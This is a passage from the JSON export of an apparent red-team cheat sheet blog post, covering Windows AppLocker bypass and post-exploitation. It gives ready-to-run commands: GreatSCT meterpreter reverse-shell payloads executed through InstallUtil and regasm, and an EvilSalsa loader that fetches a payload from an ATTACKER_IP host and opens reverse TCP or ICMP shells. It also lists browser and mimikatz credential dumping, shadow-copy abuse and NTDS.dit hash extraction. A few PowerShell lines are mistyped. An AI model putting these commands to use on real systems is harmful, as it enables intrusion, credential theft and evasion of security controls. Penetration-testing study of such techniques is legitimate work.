class=\"language-bash\"><span class=\"token comment\"># This also needs Veil-Framework</span>\npython GreatSCT.py --ip <span class=\"token number\">192.168</span>.1.56 --port <span class=\"token number\">443</span> -t Bypass -p installutil/powershell/script.py -c <span class=\"token string\">\"OBFUSCATION=ascii SCRIPT=/root/script.ps1\"</span>\n\nC:<span class=\"token punctuation\">\\</span>Windows<span class=\"token punctuation\">\\</span>Microsoft.NET<span class=\"token punctuation\">\\</span>Framework<span class=\"token punctuation\">\\</span>v4.0.30319<span class=\"token punctuation\">\\</span>InstallUtil.exe /logfile<span class=\"token operator\">=</span> /LogToConsole<span class=\"token operator\">=</span>false payload1.exe\n\npython3 GreatSCT.py -t Bypass -p regasm/meterpreter/rev_tcp --ip <span class=\"token number\">192.168</span>.1.56 --port <span class=\"token number\">9001</span>\nC:<span class=\"token punctuation\">\\</span>Windows<span class=\"token punctuation\">\\</span>Microsoft.NET<span class=\"token punctuation\">\\</span>Framework<span class=\"token punctuation\">\\</span>v4.0.30319<span class=\"token punctuation\">\\</span>regasm.exe /U payload.dll<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"EvilSalsa\"><a href=\"#EvilSalsa\" class=\"headerlink\" title=\"EvilSalsa\"></a>EvilSalsa</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\">#Preparing payloads</span>\npython EncrypterAssembly/encrypterassembly.py EvilSalsa.dll supersecretpass123 evilsalsa.dll.txt\nEncrypterAssembly.exe EvilSalsa.dll supersecretpass123 evilsalsa.dll.txt\n\n<span class=\"token comment\">#Executing payload</span>\nSalseoLoader.exe password http://ATTACKER_IP/evilsalsa.dll.txt reversetcp ATTACKER_IP <span class=\"token number\">9001</span>\n\n<span class=\"token comment\"># Reverse icmp shell</span>\npython icmpsh_m.py <span class=\"token string\">\"ATTACKER_IP\"</span> <span class=\"token string\">\"VICTIM_IP\"</span>\nSalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp ATTACKER_IP<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Tools-3\"><a href=\"#Tools-3\" class=\"headerlink\" title=\"Tools\"></a>Tools</h3><table>\n<thead>\n<tr>\n<th>Command</th>\n<th>Descriptions</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a href=\"https://github.com/GreatSCT/GreatSCT\">GreatSCT</a></td>\n<td>The project is called Great SCT (Great Scott). Great SCT is an open source project to generate application white list bypasses. This tool is intended for BOTH red and blue team.</td>\n</tr>\n</tbody></table>\n<h2 id=\"Post-exploitation\"><a href=\"#Post-exploitation\" class=\"headerlink\" title=\"Post exploitation\"></a>Post exploitation</h2><h3 id=\"Reading-Event-Logs\"><a href=\"#Reading-Event-Logs\" class=\"headerlink\" title=\"Reading Event Logs\"></a>Reading Event Logs</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">et-WinEvent -ListLog *\n\n<span class=\"token comment\"># Listing logs of a specific user</span>\n<span class=\"token variable\">$cred</span> <span class=\"token operator\">=</span> Get-Credentials\nGet -WinEvent -ListLog * -ComputerName AD1 -Credentials <span class=\"token variable\">$cred</span>\n\n<span class=\"token comment\"># Reading Security logs</span>\n<span class=\"token punctuation\">(</span>Get-WinEvent -FilterHashtable @<span class=\"token punctuation\">&#123;</span>LogName <span class=\"token operator\">=</span> <span class=\"token string\">'Security'</span><span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">|</span> Select-Object @<span class=\"token punctuation\">&#123;</span>name<span class=\"token operator\">=</span><span class=\"token string\">'NewProcessNam\ne'</span><span class=\"token punctuation\">;</span><span class=\"token assign-left variable\">expression</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span> <span class=\"token variable\">$_</span>.Properties<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span>.Value <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span>, @<span class=\"token punctuation\">&#123;</span>name<span class=\"token operator\">=</span><span class=\"token string\">'CommandLine'</span><span class=\"token punctuation\">;</span><span class=\"token assign-left variable\">expression</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$_</span>.Properties<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span>.Value <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>.commandline<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Password-Dump\"><a href=\"#Password-Dump\" class=\"headerlink\" title=\"Password Dump\"></a>Password Dump</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># Metasploit</span>\npost/windows/gather/enum_chrome\npost/multi/gather/firefox_creds\npost/firefox/gather/cookies\npost/firefox/gather/passwords\npost/windows/gather/forensics/browser_history\npost/windows/gather/enum_putty_saved_sessions\n\n<span class=\"token comment\"># Empire</span>\ncollection/ChromeDump\ncollection/FoxDump\ncollection/netripper\ncredentials/sessiongopher\n\n<span class=\"token comment\"># mimikatz</span>\nprivilege::debug\nsekurlsa::logonpasswords<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Shadow-copy\"><a href=\"#Shadow-copy\" class=\"headerlink\" title=\"Shadow copy\"></a>Shadow copy</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">diskshadow.exe\n<span class=\"token builtin class-name\">set</span> context persistent nowriters\n<span class=\"token function\">add</span> volume C: <span class=\"token builtin class-name\">alias</span> hsnhk\ncreate\nexpose %hsnhk% Z:\n\n<span class=\"token comment\"># Deletion</span>\ndelete shadows volume %hsnhk%\nreset<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"NTDS-dit-dump\"><a href=\"#NTDS-dit-dump\" class=\"headerlink\" title=\"NTDS.dit dump\"></a>NTDS.dit dump</h3><pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">secretsdump.py -system /tmp/SYSTEM -ntds /tmp/ntds.dit -outputfile /tmp/result <span class=\"token builtin class-name\">local</span>\n\npython crackmapexec.py <span class=\"token number\">192.168</span>.1.56 -u hsnhk -p pass1234 -d evilcorp.com --ntds drsuapi\n\n<span class=\"token comment\"># on DC, lsass.exe can dump hashes</span>\nlsadump::lsa /inject<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Tools-4\"><a href=\"#Tools-4\" class=\"headerlink\" title=\"Tools\"></a>Tools</h3><table>\n<thead>\n<tr>\n<th>Command</th>\n<th>Descriptions</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a href=\"https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py\">secretsdump.py</a></td>\n<td>Performs various techniques to dump hashes from the remote machine without executing any agent there.</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/byt3bl33d3r/CrackMapExec\">CrackMapExec</a></td>\n<td>A swiss army knife for pentesting networks</td>\n</tr>\n</tbody></table>\n","feature":true,"text":"List of tools and techniques required by the red team. TIP The contents of this post have been collected from various books and repositories...","link":"","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[{"name":"RedTeam","slug":"RedTeam","count":1,"path":"api/categories/RedTeam.json"},{"name":"Security","slug":"RedTeam/Security","count":1,"path":"api/categories/RedTeam/Security.json"}],"tags":[{"name":"Security","slug":"Security","count":1,"path":"api/tags/Security.json"},{"name":"RedTeam","slug":"RedTeam","count":1,"path":"api/tags/RedTeam.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Reconnaissance\"><span class=\"toc-text\">Reconnaissance</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#system-information\"><span class=\"toc-text\">system information</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Accounts\"><span class=\"toc-text\">Accounts</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Network-information\"><span class=\"toc-text\">Network information</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Processes-And-Services\"><span class=\"toc-text\">Processes And Services</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Privileges-Escalation\"><span class=\"toc-text\">Privileges Escalation</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#PowerShellMafia\"><span class=\"toc-text\">PowerShellMafia</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Unquoted-paths\"><span class=\"toc-text\">Unquoted paths</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Juicy-Potato\"><span class=\"toc-text\">Juicy Potato</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Kerberoast\"><span class=\"toc-text\">Kerberoast</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Stored-Credential\"><span class=\"toc-text\">Stored Credential</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Impersonating-Tokens-with-meterpreter\"><span class=\"toc-text\">Impersonating Tokens with meterpreter</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Tools\"><span class=\"toc-text\">Tools</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Lateral-Movement\"><span class=\"toc-text\">Lateral Movement</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Mimikatz-Ticket-PTH\"><span class=\"toc-text\">Mimikatz Ticket PTH</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#WinRM\"><span class=\"toc-text\">WinRM</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Tools-1\"><span class=\"toc-text\">Tools</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Database-Links\"><span class=\"toc-text\">Database Links</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Golden-and-Silver-Tickets\"><span class=\"toc-text\">Golden and Silver Tickets</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#AD-Attacks\"><span class=\"toc-text\">AD Attacks</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Enumeration\"><span class=\"toc-text\">Enumeration</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Bruteforce-on-ldap\"><span class=\"toc-text\">Bruteforce on ldap</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#DC-Shadow\"><span class=\"toc-text\">DC Shadow</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#DC-Sync\"><span class=\"toc-text\">DC Sync</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Tools-2\"><span class=\"toc-text\">Tools</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Bypass-Evasion-Techniques\"><span class=\"toc-text\">Bypass-Evasion Techniques</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Windows-Defender\"><span class=\"toc-text\">Windows Defender</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Firewall\"><span class=\"toc-text\">Firewall</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Ip-Whitelisting\"><span class=\"toc-text\">Ip Whitelisting</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Applocker-ByPass\"><span class=\"toc-text\">Applocker ByPass</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#GreatSCT\"><span class=\"toc-text\">GreatSCT</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#EvilSalsa\"><span class=\"toc-text\">EvilSalsa</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Tools-3\"><span class=\"toc-text\">Tools</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Post-exploitation\"><span class=\"toc-text\">Post exploitation</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Reading-Event-Logs\"><span class=\"toc-text\">Reading Event Logs</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Password-Dump\"><span class=\"toc-text\">Password Dump</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Shadow-copy\"><span class=\"toc-text\">Shadow copy</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#NTDS-dit-dump\"><span class=\"toc-text\">NTDS.dit dump</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Tools-4\"><span class=\"toc-text\">Tools</span></a></li></ol></li></ol>","author":{"name":"HSNHK","slug":"blog-author","avatar":"https://github.com/HSNHK.png?size=250","link":"/","description":"Computer student | interested in programming and security (OSCP && OSWE) | CTF Player | Red Team 🌱","socials":{"github":"https://github.com/HSNHK","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"picoCTF 2022","uid":"bc15a35120add49422efba8f0a8eb06b","slug":"picoCTF2022","date":"2022-04-13T13:39:09.000Z","updated":"2022-04-13T14:58:34.751Z","comments":true,"path":"api/articles/picoCTF2022.json","keywords":"security, ctf, redteam, programming, hacking, python, golang, linux, windows, hackthebox, ctftime","cover":null,"text":"picoCTF is the largest cybersecurity hacking competition for middle and high school students. Participants 13 years and older of all skill l...","link":"","photos":[],"count_time":{"symbolsCount":"6.8k","symbolsTime":"6 mins."},"categories":[{"name":"CTF","slug":"CTF","count":2,"path":"api/categories/CTF.json"},{"name":"Security","slug":"CTF/Security","count":2,"path":"api/categories/CTF/Security.json"}],"tags":[{"name":"Voynich","slug":"Voynich","count":2,"path":"api/tags/Voynich.json"},{"name":"CTF-Team","slug":"CTF-Team","count":2,"path":"api/tags/CTF-Team.json"},{"name":"CTF","slug":"CTF","count":1,"path":"api/tags/CTF.json"}],"author":{"name":"HSNHK","slug":"blog-author","avatar":"https://github.com/HSNHK.png?size=250","link":"/","description":"Computer student | interested in programming and security (OSCP && OSWE) | CTF Player | Red Team 🌱","socials":{"github":"https://github.com/HSNHK","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}